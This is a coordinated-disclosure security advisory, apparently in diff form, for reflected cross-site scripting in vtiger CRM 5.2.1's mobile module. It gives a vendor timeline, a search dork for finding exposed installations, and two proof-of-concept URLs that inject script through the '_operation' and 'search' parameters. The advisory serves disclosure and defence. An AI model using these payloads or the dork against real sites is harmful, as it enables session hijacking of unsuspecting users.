@@ -1,0 +1,65 @@
+
+vtiger CRM 5.2.1 Multiple Remote Cross-Site Scripting Vulnerabilities
+
+
+Vendor: vTiger
+Product web page: http://www.vtiger.com
+Affected version: 5.2.1
+
+Summary: vtiger CRM is a free, full-featured, 100% Open Source CRM software
+ideal for small and medium businesses, with low-cost product support available
+to production users that need reliable support.
+
+Desc: vtiger CRM suffers from a XSS vulnerability when parsing user input to
+the '_operation' and 'search' parameters via GET method in '/modules/mobile/index.php'
+script. Attackers can exploit this weakness to execute arbitrary HTML and script code
+in a user's browser session.
+
+Tested on: Microsoft Windows XP Professional SP3 (EN)
+           Apache/2.0.52 (Win32)
+           PHP/5.2.6
+           MySQL 5.0.51b-community-nt-log
+
+
+Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+                            @zeroscience
+
+
+Vendor status:
+
+[28.07.2011] Vulnerabilities discovered.
+[28.07.2011] Initial contact with the vendor.
+[29.07.2011] Vendor replies asking more details.
+[29.07.2011] Sent details to vendor.
+[01.08.2011] Requested status update from vendor.
+[02.08.2011] Vendor investigates and confirms issues.
+[02.08.2011] Asked vendor for patch release date.
+[04.08.2011] No reply from vendor.
+[05.08.2011] Asked vendor to specify patch release date.
+[05.08.2011] Vendor plans to release the 5.3.0 RC by the end of the month.
+[21.08.2011] Asked vendor for specific patch release date.
+[22.08.2011] Vendor replies promising official release by mid September.
+[14.09.2011] Asked vendor for update.
+[14.09.2011] Vendor replies extending official release date.
+[26.10.2011] Coordinated public security advisory released.
+
+
+
+
+Advisory ID: ZSL-2011-5052
+Advisory URL: http://www.zeroscience.mk/en/vulnerabilities/ZSL-2011-5052.php
+
+Vendor: http://wiki.vtiger.com/index.php/Vtiger530:Release_Notes
+
+GHDB: http://www.exploit-db.com/ghdb/3737/
+
+
+28.07.2011
+
+---
+
+
+ Dork: intitle:"vtiger CRM 5 - Commercial Open Source CRM"
+
+ http://localhost:8888/modules/mobile/index.php?_operation="><script>alert(1)</script>
+ http://localhost:8888/modules/mobile/index.php?_operation=listModuleRecords&module=Services&search="><script>alert(1)</script>
